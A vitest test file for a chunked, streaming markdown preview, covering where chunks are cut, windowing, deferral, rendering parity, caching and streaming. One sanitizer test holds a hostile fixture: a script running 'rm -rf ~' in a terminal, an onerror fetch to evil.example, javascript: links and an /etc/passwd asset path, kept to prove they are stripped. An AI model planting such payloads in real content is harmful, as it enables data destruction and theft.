/**
 * PHASE 255 — the preview paints as you arrive, pinned clause by clause.
 *
 * The preview cuts a document at blank lines where a cut cannot change the
 * page (window-scan.ts), parses each chunk with markdown-it and hands it to
 * the same sanitizer, Shiki step and components map (chunk-parse.ts,
 * markdown-impl.tsx), draws a first window and streams the rest. Each
 * describe below is one promise, and each is written so it can fail:
 *
 *   1. THE CUTS. Never inside a list, a fence, an element parse5 would still
 *      hold open, an HTML comment or before an indented code line; a tag in
 *      backticks, in indented code or in a one-line comment is not a tag; an
 *      unclosed hero <p> is closed by the heading after it; the chunks tile
 *      the source; a footnote document is never cut, wherever its definition
 *      sits; reference definitions are read by markdown-it and reach every
 *      chunk, the first one winning and a lookalike drawn once.
 *   2. THE WINDOW. A window stops at its chunk count and at its char budget,
 *      takes at least one chunk, and successive windows cover every chunk
 *      exactly once.
 *   3. THE GUARD. Size alone never defers; a first chunk past the cap does,
 *      at its exact boundary.
 *   4. THE PAGE. The SHIPPING MarkdownDocument draws the same markup as the
 *      old react-markdown render over a fixture of every construct the
 *      preview styles, a table's scroller and a fence are direct children of
 *      the content box, the hostile fixture reaches nothing, and Shiki's
 *      styles are added after the sanitizer and survive.
 *   5. THE CACHE. An edit inside one paragraph of a large document changes
 *      exactly one chunk's text, and a changed definition redraws the chunks
 *      that read it and no others.
 *   6. THE STREAM. A window is parsed in one task and drawn in the next.
 *
 * WHAT IT DOES NOT PROVE: milliseconds, streaming order or effects — this
 * tree has no DOM under vitest. Those are probe:p255's, in the running app,
 * at the parent and at HEAD. The corpus-wide DOM diff and the ablations are
 * conformance:preview's.
 */

import { describe, expect, it } from 'vitest';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { parseFragment } from 'parse5';
import type { Root } from 'hast';
import {
  WINDOW_BATCH_CHARS,
  WINDOW_BATCH_CHUNKS,
  WINDOW_INITIAL_CHARS,
  WINDOW_INITIAL_CHUNKS,
  chunkTexts,
  hasFootnotes,
  scanChunks,
  windowEnd,
  type Chunk
} from '../window-scan';
import {
  PREVIEW_DEFER_CHARS,
  PREVIEW_DEFER_FIRST_CHUNK_CHARS,
  previewDeferred
} from '../large-prose';
import { MarkdownDocument, previewComponents } from '../markdown-impl';
import {
  collectReferences,
  createChunkParser,
  createChunkProcessor,
  createChunkRenderer,
  createReferenceCollector,
  sameChunkProps,
  streamWindow
} from '../chunk-parse';
import { markdownRehypePlugins } from '../pipeline';
import { GMUX_THEME_NAME } from '../../../pierre/theme-bridge';

const para = (i: number): string => `Paragraph ${i} carries a few plain words.`;
/** N blank-separated paragraphs: every blank between them is cuttable. */
const paragraphs = (n: number, from = 0): string =>
  Array.from({ length: n }, (_, i) => para(from + i)).join('\n\n');

/** The source text of every chunk, for asserting where the cuts fell. */
const pieces = (src: string, target = 2): string[] =>
  scanChunks(src, target).chunks.map((c) => src.slice(c.start, c.end));

describe('1. the cuts', () => {
  it('tiles the source exactly and cuts ordinary paragraphs', () => {
    const src = paragraphs(40);
    const plan = scanChunks(src, 4);
    expect(plan.chunks.length).toBeGreaterThan(5);
    expect(plan.chunks[0]?.start).toBe(0);
    expect(plan.chunks.at(-1)?.end).toBe(src.length);
    for (let i = 1; i < plan.chunks.length; i++) {
      expect(plan.chunks[i]?.start).toBe(plan.chunks[i - 1]?.end);
    }
    expect(plan.chunks.map((c) => src.slice(c.start, c.end)).join('')).toBe(src);
  });

  it('never cuts inside a loose list', () => {
    const list = Array.from({ length: 30 }, (_, i) => `- item ${i}`).join('\n\n');
    const src = `${paragraphs(3)}\n\n${list}\n\n${paragraphs(3, 10)}`;
    const holding = pieces(src).filter((p) => p.includes('- item'));
    expect(holding).toHaveLength(1);
    expect(holding[0]).toContain('- item 0');
    expect(holding[0]).toContain('- item 29');
  });

  it('never cuts inside a fence with blank lines in it', () => {
    const fence = ['```ts', ...Array.from({ length: 20 }, (_, i) => `const a${i} = ${i};\n`), '```'].join('\n');
    const src = `${paragraphs(3)}\n\n${fence}\n\n${paragraphs(3, 10)}`;
    const holding = pieces(src).filter((p) => p.includes('const a'));
    expect(holding).toHaveLength(1);
    expect(holding[0]).toContain('const a0');
    expect(holding[0]).toContain('const a19');
  });

  it('never cuts while a raw container tag is open, or inside a comment', () => {
    const details = `<details>\n<summary>more</summary>\n\n${paragraphs(10, 50)}\n\n</details>`;
    const comment = `<!--\n\n${paragraphs(10, 80)}\n\n-->`;
    for (const block of [details, comment]) {
      const src = `${paragraphs(3)}\n\n${block}\n\n${paragraphs(3, 10)}`;
      const holding = pieces(src).filter((p) => p.includes('Paragraph 5') || p.includes('Paragraph 8'));
      expect(holding).toHaveLength(1);
    }
  });

  it('a tag written in backticks does not hold every later cut closed', () => {
    const src = `Write \`<table>\` and \`<details>\` to get one.\n\n${paragraphs(30)}`;
    expect(scanChunks(src, 4).chunks.length).toBeGreaterThan(5);
  });

  it('never cuts before an indented code line, tabs expanded', () => {
    const src = `${paragraphs(3)}\n\n\tcode one\n\n\tcode two\n\n${paragraphs(3, 10)}`;
    const holding = pieces(src).filter((p) => p.includes('code one'));
    expect(holding[0]).toContain('code two');
  });

  it('holds the cuts closed while parse5 would hold an element open, and only then', () => {
    const inside = (block: string): number => {
      const src = `${paragraphs(3)}\n\n${block}\n\n${paragraphs(3, 60)}`;
      return pieces(src).filter((p) => p.includes('Paragraph 51')).length === 1 &&
        pieces(src).filter((p) => p.includes('Paragraph 51') && p.includes('Paragraph 54')).length === 1
        ? 1
        : 0;
    };
    // An ordinary element an HTML block opens, and a formatting element a
    // paragraph opens (reconstructed into every paragraph after it).
    expect(inside(`<span class="x">\n\n${paragraphs(4, 51)}\n\n</span>`)).toBe(1);
    expect(inside(`Some <b>bold words.\n\n${paragraphs(4, 51)}\n\n</b>`)).toBe(1);
    // An end tag in indented code or in a one-line comment closes nothing.
    expect(inside(`<div>\n\n    </div>\n\n${paragraphs(4, 51)}\n\n</div>`)).toBe(1);
    expect(inside(`<div>\n\n<!-- </div> -->\n\n${paragraphs(4, 51)}\n\n</div>`)).toBe(1);
    // Raw text opened mid-paragraph swallows blank lines until its end tag.
    expect(inside(`Type into a <textarea> here.\n\n${paragraphs(4, 51)}\n\n</textarea> after.`)).toBe(1);
  });

  it('cuts where parse5 has closed what was opened', () => {
    // A span opened inside a paragraph ends with the paragraph.
    expect(scanChunks(`Returns Promise<void> or <span>x.\n\n${paragraphs(30)}`, 2).chunks.length).toBeGreaterThan(20);
    // A heading's own tag closes a README's unclosed hero <p>.
    expect(scanChunks(`<p align="center">\n  <img src="logo.png">\n\n# Title\n\n${paragraphs(30)}`, 2).chunks.length).toBeGreaterThan(20);
    // A self-closed svg closes.
    expect(scanChunks(`An icon <svg viewBox="0 0 1 1"/> here.\n\n${paragraphs(30)}`, 2).chunks.length).toBeGreaterThan(20);
  });

  it('knows a footnote document, the one shape that is never windowed', () => {
    expect(hasFootnotes(`${paragraphs(40)}\n\n[^1]: the note\n`)).toBe(true);
    expect(hasFootnotes(`${paragraphs(40)}\n\nA use of [^1] with no definition.\n`)).toBe(false);
    expect(hasFootnotes('   [^note]: indented three\n')).toBe(true);
    expect(hasFootnotes('Text[^q].\n\n> [^q]: in a quote\n')).toBe(true);
    expect(hasFootnotes('Text[^l].\n\n- [^l]: in a list item\n')).toBe(true);
  });

  it('reads definitions as markdown-it does and hands every chunk the table', () => {
    const texts = (src: string): string[] => chunkTexts(src, scanChunks(src, 2));
    const src = [
      '[site]: https://first.example',
      paragraphs(20),
      'See [site], [q], [x] and [Note].',
      '[Note]: remember to do this later',
      '<!--\n\n[x]: https://hidden.example\n\n-->',
      '> [q]: https://quote.example',
      '[site]: https://second.example\nSee [site] again.'
    ].join('\n\n');
    // Nothing is prepended: the chunks are the source.
    expect(texts(src).join('')).toBe(src);
    const table = collectReferences(createReferenceCollector(), texts(src));
    expect(Object.keys(table).sort()).toEqual(['Q', 'SITE']);
    expect(table['SITE']?.href).toBe('https://first.example');
    const doc = renderToStaticMarkup(<Doc source={src} />);
    expect(doc).toContain('href="https://first.example"');
    expect(doc).toContain('href="https://quote.example"');
    expect(doc).not.toContain('second.example"');
    expect(doc).not.toContain('hidden.example"');
    // A line that only looks like a definition is drawn once, where it is.
    expect(doc.split('remember to do this later')).toHaveLength(2);
  });
});

describe('2. the window', () => {
  const sized = (sizes: number[]): Chunk[] => {
    let at = 0;
    return sizes.map((s) => ({ start: at, end: (at += s) }));
  };

  it('stops at its chunk count', () => {
    const chunks = sized(Array(40).fill(100));
    expect(windowEnd(chunks, 0, WINDOW_INITIAL_CHUNKS, WINDOW_INITIAL_CHARS)).toBe(WINDOW_INITIAL_CHUNKS);
    expect(windowEnd(chunks, 30, WINDOW_BATCH_CHUNKS, WINDOW_BATCH_CHARS)).toBe(40);
  });

  it('stops before the chunk that would pass its char budget, and always takes one', () => {
    const big = WINDOW_BATCH_CHARS;
    const chunks = sized([100, big, 100, big * 3, 100]);
    expect(windowEnd(chunks, 0, WINDOW_BATCH_CHUNKS, WINDOW_BATCH_CHARS)).toBe(1);
    expect(windowEnd(chunks, 1, WINDOW_BATCH_CHUNKS, WINDOW_BATCH_CHARS)).toBe(2);
    expect(windowEnd(chunks, 3, WINDOW_BATCH_CHUNKS, WINDOW_BATCH_CHARS)).toBe(4);
    expect(windowEnd(chunks, 5, WINDOW_BATCH_CHUNKS, WINDOW_BATCH_CHARS)).toBe(5);
  });

  it('successive windows draw every chunk exactly once', () => {
    const src = `${paragraphs(2000)}\n\n${Array.from({ length: 300 }, (_, i) => `- item ${i}`).join('\n\n')}`;
    const { chunks } = scanChunks(src);
    const drawn: number[] = [];
    let end = windowEnd(chunks, 0, WINDOW_INITIAL_CHUNKS, WINDOW_INITIAL_CHARS);
    for (let i = 0; i < end; i++) drawn.push(i);
    while (end < chunks.length) {
      const next = windowEnd(chunks, end, WINDOW_BATCH_CHUNKS, WINDOW_BATCH_CHARS);
      expect(next).toBeGreaterThan(end);
      for (let i = end; i < next; i++) drawn.push(i);
      end = next;
    }
    expect(drawn).toEqual(chunks.map((_, i) => i));
  });
});

describe('3. the guard', () => {
  /** A blank-free table from byte 0, `rows` rows long, then prose. */
  const tableFirst = (chars: number): string => {
    const head = '| a | b |\n| --- | --- |\n';
    const row = '| cell | cell |\n';
    const body = row.repeat(Math.ceil((chars - head.length) / row.length));
    return `${head}${body}\n${paragraphs(4)}\n`;
  };

  it('size alone never defers: a large document of ordinary prose opens rendered', () => {
    const src = paragraphs(120000);
    expect(src.length).toBeGreaterThan(PREVIEW_DEFER_FIRST_CHUNK_CHARS * 2);
    expect(previewDeferred(src)).toBe(false);
  });

  it('a first chunk past the cap defers, and one at the cap does not', () => {
    const past = tableFirst(PREVIEW_DEFER_FIRST_CHUNK_CHARS + 64);
    const first = scanChunks(past).chunks[0] as Chunk;
    expect(first.end - first.start).toBeGreaterThan(PREVIEW_DEFER_FIRST_CHUNK_CHARS);
    expect(previewDeferred(past)).toBe(true);
    const under = tableFirst(PREVIEW_DEFER_FIRST_CHUNK_CHARS - 4096);
    const underFirst = scanChunks(under).chunks[0] as Chunk;
    expect(underFirst.end - underFirst.start).toBeLessThanOrEqual(PREVIEW_DEFER_FIRST_CHUNK_CHARS);
    expect(under.length).toBeGreaterThan(PREVIEW_DEFER_CHARS);
    expect(previewDeferred(under)).toBe(false);
  });
});

/** The shipping document, with a stable link handler. */
const noop = (): void => undefined;
function Doc({ source, highlighter = null }: { source: string; highlighter?: unknown }): React.JSX.Element {
  return (
    <MarkdownDocument
      source={source}
      filePath="/repo/docs/readme.md"
      rootPath="/repo"
      highlighter={highlighter as never}
      onOpenFile={noop}
    />
  );
}
/** The OLD render: react-markdown, remark-gfm, the same plugins and components. */
function OldDoc({ source }: { source: string }): React.JSX.Element {
  return (
    <Markdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={markdownRehypePlugins(null, GMUX_THEME_NAME)}
      components={previewComponents('/repo/docs/readme.md', '/repo', noop)}
    >
      {source}
    </Markdown>
  );
}

const EVERY_CONSTRUCT = [
  '# Title',
  'Setext heading\n---',
  'Some *emphasis*, **strong**, `code`, ~~gone~~ and a [link](https://example.com) and [a file](../src/app.ts) and [an anchor](#title).',
  '- tight one\n- tight two',
  '- loose one\n\n- loose two',
  '1. first\n2. second',
  '- [ ] open task\n- [x] done task',
  '> quoted\n> still quoted',
  '| left | centre | right |\n| :--- | :---: | ---: |\n| a | b | c |',
  '```ts\nconst x: number = 1;\n```',
  '    indented code',
  '<details>\n<summary>More</summary>\n\nHidden **text**.\n\n</details>',
  '![remote](https://example.com/x.png) ![local](./pic.png)',
  'Autolinks: https://example.com/path and www.example.com.',
  '***',
  'Hard  \nbreak'
].join('\n\n');

/**
 * The one difference the two renders are allowed over these constructs:
 * WHITESPACE-ONLY TEXT BETWEEN TAGS. markdown-it ends each block with a
 * newline and remark places the newlines of a table beside its wrapper
 * rather than inside it; the DOM draws none of it, because whitespace
 * between block boxes collapses to nothing. Removing it on both sides is
 * the whole normalization, and it cannot hide a word, a tag or an attribute.
 */
const blocks = (markup: string): string => markup.replace(/>\s+</g, '><').replace(/^\s+|\s+$/g, '');

describe('4. the page', () => {
  it('draws the same markup as the old render over every construct the preview styles', () => {
    for (const part of EVERY_CONSTRUCT.split('\n\n').concat(EVERY_CONSTRUCT)) {
      expect(blocks(renderToStaticMarkup(<Doc source={part} />))).toBe(
        blocks(renderToStaticMarkup(<OldDoc source={part} />))
      );
    }
  });

  it('links a bare www. address the way GFM does', () => {
    for (const src of ['www.example.com', 'Visit www.commonmark.org/help for more.', '(www.example.com)', 'www.example.com.', '*www.example.com*']) {
      const markup = renderToStaticMarkup(<Doc source={src} />);
      expect(markup).toContain('href="http://www.');
      expect(blocks(markup)).toBe(blocks(renderToStaticMarkup(<OldDoc source={src} />)));
    }
  });

  it('keeps a table scroller and a fence as DIRECT children of the content box', () => {
    const markup = `<div class="md-content">${renderToStaticMarkup(<Doc source={EVERY_CONSTRUCT} />)}</div>`;
    const root = parseFragment(markup).childNodes[0] as unknown as {
      childNodes: { nodeName: string; attrs?: { name: string; value: string }[] }[];
    };
    const direct = root.childNodes.map((n) =>
      n.nodeName === 'div' ? `div.${n.attrs?.find((a) => a.name === 'class')?.value ?? ''}` : n.nodeName
    );
    expect(direct).toContain('div.md-table-scroll');
    expect(direct).toContain('pre');
  });

  it('lets nothing hostile through the new path', () => {
    const hostile = [
      'Before the attack.',
      '<script>window.gmux.terminalWrite("rm -rf ~")</script>',
      '<img src=x onerror="fetch(\'https://evil.example/x\')">',
      '<iframe src="https://evil.example/frame"></iframe>',
      '<a href="javascript:alert(document.title)">raw link</a>',
      '[click me](javascript:alert(document.title))',
      '<div style="position:fixed;inset:0">cover</div>',
      '<img src="gmux-asset://local/%2Fetc%2Fpasswd">',
      'After the attack.'
    ].join('\n\n');
    const markup = renderToStaticMarkup(<Doc source={hostile} />);
    expect(markup).toContain('Before the attack.');
    expect(markup).toContain('After the attack.');
    // `passwd`: a gmux-asset URL written into the file by hand is refused by
    // react-markdown's URL transform, which chunk-parse.ts runs as the old
    // path did; the image component then resolves an empty src beside the
    // document, never the path the file asked for.
    for (const bad of ['<script', '<iframe', 'onerror', 'evil.example', 'position:fixed', 'style=', 'passwd']) {
      expect(markup).not.toContain(bad);
    }
    // And apart from the one refused-scheme markdown link below, the new path
    // draws the hostile fixture exactly as the old one did.
    const withoutMarkdownLink = hostile.replace('[click me](javascript:alert(document.title))', '');
    expect(blocks(renderToStaticMarkup(<Doc source={withoutMarkdownLink} />))).toBe(
      blocks(renderToStaticMarkup(<OldDoc source={withoutMarkdownLink} />))
    );
    // No attribute anywhere carries a javascript: URL. The markdown link's
    // words may remain as TEXT: markdown-it's validateLink leaves a refused
    // scheme's markdown unparsed where remark made an element and the
    // sanitizer stripped its href (chunk-parse.ts header).
    expect(markup).not.toMatch(/="[^"]*javascript:/i);
    expect(markup).not.toMatch(/<a[^>]*>click me/);
  });

  it("adds Shiki's styles after the sanitizer, so they survive", () => {
    const stub = {
      getLoadedLanguages: () => ['ts', 'text'],
      loadLanguage: async () => undefined,
      codeToHast: (code: string): Root => ({
        type: 'root',
        children: [
          {
            type: 'element',
            tagName: 'pre',
            properties: { className: ['shiki'], style: 'background-color:#131417' },
            children: [{ type: 'element', tagName: 'code', properties: {}, children: [{ type: 'element', tagName: 'span', properties: { style: 'color:#6CB6FF' }, children: [{ type: 'text', value: code }] }] }]
          }
        ]
      })
    };
    const markup = renderToStaticMarkup(<Doc source={'```ts\nconst x = 1;\n```'} highlighter={stub} />);
    expect(markup).toContain('background-color:#131417');
    expect(markup).toContain('color:#6CB6FF');
  });

  it('draws a footnote document on the old path, exactly', () => {
    // Exactly, with no normalization: it IS the old path.
    const src = 'A claim.[^1]\n\n[^1]: The note.';
    expect(renderToStaticMarkup(<Doc source={src} />)).toBe(renderToStaticMarkup(<OldDoc source={src} />));
  });
});

describe('5. the cache', () => {
  it('an edit inside one paragraph changes exactly one chunk', () => {
    const src = paragraphs(3000);
    const edited = src.replace('Paragraph 1500 carries', 'Paragraph 1500 now carries');
    const a = chunkTexts(src, scanChunks(src));
    const b = chunkTexts(edited, scanChunks(edited));
    expect(b).toHaveLength(a.length);
    expect(a.filter((t, i) => t !== b[i])).toHaveLength(1);
  });

  it('a changed definition redraws the chunks that read it and no others', () => {
    const doc = (href: string): string =>
      `${paragraphs(10)}\n\nSee [site].\n\n${paragraphs(200, 100)}\n\nSee [site] again.\n\n${paragraphs(40, 400)}\n\n[site]: ${href}\n`;
    const collector = createReferenceCollector();
    const renderer = createChunkRenderer(createChunkParser(), createChunkProcessor(null, GMUX_THEME_NAME), (t) => t);
    const a = chunkTexts(doc('https://a.example'), scanChunks(doc('https://a.example')));
    const refsA = collectReferences(collector, a);
    for (const t of a) renderer.render(t, refsA);
    const b = chunkTexts(doc('https://b.example'), scanChunks(doc('https://b.example')));
    const refsB = collectReferences(collector, b);
    const redrawn = b.filter((t, i) => !sameChunkProps({ text: a[i] as string, references: refsA, renderer }, { text: t, references: refsB, renderer }));
    expect(redrawn).toHaveLength(3);
    expect(redrawn.filter((t) => t.includes('[site]'))).toHaveLength(3);
  });
});

describe('6. the stream', () => {
  it('parses a window in one task and draws it in the next', () => {
    const tasks: (() => void)[] = [];
    const log: string[] = [];
    streamWindow(
      (task) => {
        tasks.push(task);
        return () => undefined;
      },
      () => log.push('parse'),
      () => log.push('draw')
    );
    tasks.shift()?.();
    expect(log).toEqual(['parse']);
    tasks.shift()?.();
    expect(log).toEqual(['parse', 'draw']);
  });
});
